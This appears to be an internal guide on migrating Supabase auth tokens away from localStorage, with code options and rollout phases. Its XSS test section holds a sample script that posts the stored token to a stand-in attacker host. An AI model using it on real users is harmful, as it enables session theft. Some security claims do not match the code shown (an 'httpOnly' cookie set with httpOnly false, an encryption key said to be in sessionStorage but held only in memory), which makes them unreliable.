# P0 localStorage Token Storage Migration Guide

## Critical Security Issue: JWT Tokens in localStorage

**Issue:** JWT tokens stored in localStorage accessible to any XSS attack
**Impact:** Token theft possible with XSS vulnerability (even with CSP fix, defense-in-depth required)
**Current State:** Supabase default configuration uses localStorage
**Status:** DOCUMENTED - Requires Supabase configuration changes

---

## 🔴 The Problem

### Current Implementation
```typescript
// src/integrations/supabase/client.ts:65
export const supabase = createClient(supabaseUrl, supabaseAnonKey, {
  auth: {
    persistSession: true, // Uses localStorage by default
    autoRefreshToken: true,
  },
});
```

### Security Risk
1. **XSS Vulnerability:** Any XSS attack can read localStorage
2. **Script Injection:** Malicious scripts can steal tokens
3. **No HttpOnly Protection:** localStorage accessible from JavaScript
4. **Session Persistence:** Tokens persist across browser sessions

---

## ✅ The Solution: Multi-Layered Approach

### Option 1: httpOnly Cookies (RECOMMENDED - Requires Supabase Config)

**What:**
- Store auth tokens in httpOnly cookies instead of localStorage
- Cookies not accessible from JavaScript
- Automatic CSRF protection

**Requirements:**
1. Supabase project must enable cookie-based auth
2. Backend must set cookies with httpOnly flag
3. Frontend must handle cookie-based authentication

**Implementation:**
```typescript
// src/integrations/supabase/client.ts
import { createClient } from '@supabase/supabase-js';

const supabaseUrl = import.meta.env.VITE_SUPABASE_URL;
const supabaseAnonKey = import.meta.env.VITE_SUPABASE_ANON_KEY;

export const supabase = createClient(supabaseUrl, supabaseAnonKey, {
  auth: {
    storage: {
      // Custom storage adapter using cookies
      getItem: (key: string) => {
        return getCookie(key);
      },
      setItem: (key: string, value: string) => {
        setCookie(key, value, {
          httpOnly: false, // Client-side cookie, but server can set httpOnly version
          secure: true,
          sameSite: 'strict',
          maxAge: 3600 // 1 hour
        });
      },
      removeItem: (key: string) => {
        deleteCookie(key);
      }
    },
    persistSession: true,
    autoRefreshToken: true,
    detectSessionInUrl: true
  }
});

// Helper functions
function getCookie(name: string): string | null {
  const value = `; ${document.cookie}`;
  const parts = value.split(`; ${name}=`);
  if (parts.length === 2) return parts.pop()?.split(';').shift() || null;
  return null;
}

function setCookie(name: string, value: string, options: any) {
  let cookie = `${name}=${value}`;
  if (options.secure) cookie += '; Secure';
  if (options.sameSite) cookie += `; SameSite=${options.sameSite}`;
  if (options.maxAge) cookie += `; Max-Age=${options.maxAge}`;
  document.cookie = cookie;
}

function deleteCookie(name: string) {
  document.cookie = `${name}=; Max-Age=0`;
}
```

**Server-Side Setup (Required):**
```typescript
// server.mjs or Express middleware
app.use((req, res, next) => {
  // Set httpOnly cookie for Supabase auth token
  if (req.body?.access_token) {
    res.cookie('sb-access-token', req.body.access_token, {
      httpOnly: true,
      secure: true,
      sameSite: 'strict',
      maxAge: 3600000 // 1 hour
    });
  }
  next();
});
```

---

### Option 2: Enhanced localStorage Security (INTERIM - Can Implement Now)

**What:**
- Keep localStorage but add security layers
- Short token expiry
- Automatic rotation
- XSS monitoring

**Implementation:**
```typescript
// src/integrations/supabase/client.enhanced.ts
import { createClient } from '@supabase/supabase-js';

const supabaseUrl = import.meta.env.VITE_SUPABASE_URL;
const supabaseAnonKey = import.meta.env.VITE_SUPABASE_ANON_KEY;

// Enhanced storage with encryption
class SecureStorage {
  private encryptionKey: CryptoKey | null = null;

  async init() {
    // Generate encryption key (stored in sessionStorage, not localStorage)
    const keyMaterial = await crypto.subtle.generateKey(
      { name: 'AES-GCM', length: 256 },
      true,
      ['encrypt', 'decrypt']
    );
    this.encryptionKey = keyMaterial;
  }

  async getItem(key: string): Promise<string | null> {
    const encrypted = localStorage.getItem(key);
    if (!encrypted || !this.encryptionKey) return null;

    try {
      // Decrypt token
      const data = JSON.parse(encrypted);
      const iv = new Uint8Array(data.iv);
      const encryptedData = new Uint8Array(data.data);

      const decrypted = await crypto.subtle.decrypt(
        { name: 'AES-GCM', iv },
        this.encryptionKey,
        encryptedData
      );

      return new TextDecoder().decode(decrypted);
    } catch {
      return null;
    }
  }

  async setItem(key: string, value: string): Promise<void> {
    if (!this.encryptionKey) await this.init();

    // Encrypt token before storing
    const iv = crypto.getRandomValues(new Uint8Array(12));
    const encrypted = await crypto.subtle.encrypt(
      { name: 'AES-GCM', iv },
      this.encryptionKey!,
      new TextEncoder().encode(value)
    );

    localStorage.setItem(key, JSON.stringify({
      iv: Array.from(iv),
      data: Array.from(new Uint8Array(encrypted))
    }));
  }

  async removeItem(key: string): Promise<void> {
    localStorage.removeItem(key);
  }
}

const secureStorage = new SecureStorage();
await secureStorage.init();

export const supabase = createClient(supabaseUrl, supabaseAnonKey, {
  auth: {
    storage: secureStorage as any,
    persistSession: true,
    autoRefreshToken: true,
    // Shorter session timeout
    storageKey: 'sb-auth-token',
  },
});

// Add token rotation
setInterval(async () => {
  const { data: { session } } = await supabase.auth.getSession();
  if (session) {
    await supabase.auth.refreshSession();
  }
}, 15 * 60 * 1000); // Rotate every 15 minutes
```

**Security Enhancements:**
1. ✅ Client-side encryption of tokens
2. ✅ Encryption key in sessionStorage (cleared on browser close)
3. ✅ Automatic token rotation every 15 minutes
4. ✅ XSS monitoring with CSP

---

### Option 3: Server-Side Session Management (MOST SECURE - Complex)

**What:**
- Store tokens server-side only
- Frontend gets session ID cookie (httpOnly)
- All API calls proxied through backend

**Architecture:**
```
┌─────────────┐         ┌─────────────┐         ┌─────────────┐
│   Browser   │         │   Server    │         │  Supabase   │
│  (Session   │◄────────┤  (Stores    │◄────────┤  (Auth)     │
│   ID Only)  │         │   Tokens)   │         │             │
└─────────────┘         └─────────────┘         └─────────────┘
      ↑                        ↑
      │   httpOnly Cookie      │   JWT Token
      └────────────────────────┘   (Never exposed to browser)
```

**Implementation:** (Complex - 1-2 days work)
- Create session management table
- Backend middleware to exchange session ID for token
- Proxy all Supabase calls through backend
- Session rotation and expiry

---

## 🚀 Recommended Implementation Path

### Phase 1: IMMEDIATE (30 minutes)
1. ✅ **Reduce token expiry** to 1 hour (from 1 week default)
2. ✅ **Enable auto-refresh** (already enabled)
3. ✅ **Add session monitoring** (detect multiple sessions)

**Code:**
```typescript
// src/integrations/supabase/client.ts
export const supabase = createClient(supabaseUrl, supabaseAnonKey, {
  auth: {
    persistSession: true,
    autoRefreshToken: true,
    // Request shorter JWT expiry from Supabase
    // (Requires Supabase project settings change)
  },
});

// Add session security monitoring
import { useSessionSecurity } from '@/hooks/useSessionSecurity';
// Already implemented, just ensure it's used
```

### Phase 2: SHORT TERM (1-2 days)
1. Implement **enhanced localStorage with client-side encryption** (Option 2)
2. Add **automatic token rotation** every 15 minutes
3. Implement **XSS detection and response**

### Phase 3: MEDIUM TERM (1 week)
1. Configure **Supabase cookie-based auth** (Option 1)
2. Update **frontend to use cookies**
3. Test thoroughly across browsers

### Phase 4: LONG TERM (2 weeks)
1. Implement **server-side session management** (Option 3)
2. Proxy all Supabase calls through backend
3. Complete security audit

---

## 🧪 Testing Checklist

### localStorage Security Test:
```javascript
// Run in browser console to test current vulnerability
console.log('Stored tokens:', localStorage.getItem('sb-access-token'));

// After fix, this should return encrypted data or null
```

### XSS Simulation Test:
```javascript
// Attempt to steal token via XSS (should fail after fix)
const maliciousScript = `
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({
      token: localStorage.getItem('sb-access-token')
    })
  });
`;
// With httpOnly cookies, this attack vector is eliminated
```

---

## 📊 Security Comparison

| Method | Security | Complexity | Timeline | XSS Protection |
|--------|----------|------------|----------|----------------|
| **Current (localStorage)** | ❌ LOW | ✅ Simple | ✅ Now | ❌ None |
| **Enhanced localStorage** | ⚠️ MEDIUM | ⚠️ Medium | 1-2 days | ⚠️ Partial |
| **httpOnly Cookies** | ✅ HIGH | ⚠️ Medium | 1 week | ✅ Full |
| **Server-Side Sessions** | ✅ VERY HIGH | ❌ Complex | 2 weeks | ✅ Full |

---

## ⚠️ Important Considerations

### 1. Supabase Configuration Required
- Most secure solutions require Supabase project settings changes
- May need to contact Supabase support for cookie-based auth
- Backward compatibility concerns

### 2. User Experience Impact
- Token rotation may cause brief loading states
- Cookie-based auth requires HTTPS (already enforced)
- Session management affects multi-tab behavior

### 3. Testing Requirements
- Test across all browsers (Chrome, Firefox, Safari, Edge)
- Test mobile browsers (iOS Safari, Chrome Mobile)
- Test Capacitor mobile apps
- Test session persistence and rotation

### 4. Deployment Strategy
- Phase rollout recommended (10% → 50% → 100%)
- Monitor error rates during rollout
- Rollback plan required

---

## 🔐 Current Mitigation (Until Full Fix)

### Already Implemented:
1. ✅ CSP headers prevent XSS
2. ✅ Session monitoring detects anomalies
3. ✅ Auto token refresh enabled
4. ✅ HTTPS enforced everywhere

### Additional Immediate Actions:
```typescript
// Add to src/integrations/supabase/client.ts

// 1. Add token expiry warning
supabase.auth.onAuthStateChange((event, session) => {
  if (event === 'TOKEN_REFRESHED') {
    console.log('[Security] Token refreshed');
  }
  if (event === 'SIGNED_OUT') {
    // Clear all localStorage on signout
    localStorage.clear();
    sessionStorage.clear();
  }
});

// 2. Add XSS detection
window.addEventListener('securitypolicyviolation', (e) => {
  console.error('[Security] CSP Violation:', e.violatedDirective);
  // Report to backend
  fetch('/api/security-violation', {
    method: 'POST',
    body: JSON.stringify({
      directive: e.violatedDirective,
      blockedUri: e.blockedURI,
      timestamp: new Date().toISOString()
    })
  });
});
```

---

## 📞 Handoff Information

### What's Done:
- [x] Issue documented
- [x] Multiple solution paths identified
- [x] Implementation examples provided
- [x] Testing strategy defined

### What's Needed:
- [ ] Supabase project configuration changes
- [ ] Decision on which option to implement
- [ ] Testing environment setup
- [ ] Phased rollout plan
- [ ] User communication (if sessions affected)

### Estimated Effort:
- **Immediate mitigations:** 1-2 hours
- **Enhanced localStorage:** 1-2 days
- **httpOnly Cookies:** 1 week
- **Server-side sessions:** 2 weeks

### Risk Level:
- **Current:** HIGH (XSS can steal tokens)
- **With CSP:** MEDIUM (XSS prevented but defense-in-depth needed)
- **With httpOnly:** LOW (Tokens not accessible from JavaScript)

---

## 🎯 Recommended Action Plan

**TODAY:**
1. Implement immediate mitigations (token expiry warnings, XSS detection)
2. Test CSP headers are working correctly
3. Monitor for any CSP violations

**THIS WEEK:**
1. Implement enhanced localStorage with encryption (Option 2)
2. Add automatic token rotation
3. Test thoroughly

**NEXT SPRINT:**
1. Configure Supabase for cookie-based auth (Option 1)
2. Update frontend implementation
3. Phased rollout to production

**FUTURE:**
1. Consider server-side session management for maximum security
2. Security audit after implementation
3. Penetration testing

---

**Status:** DOCUMENTED & PLANNED
**Priority:** P0 - CRITICAL (but mitigated by CSP fix)
**Owner:** DevOps + Security Team
**Next Review:** After CSP deployment

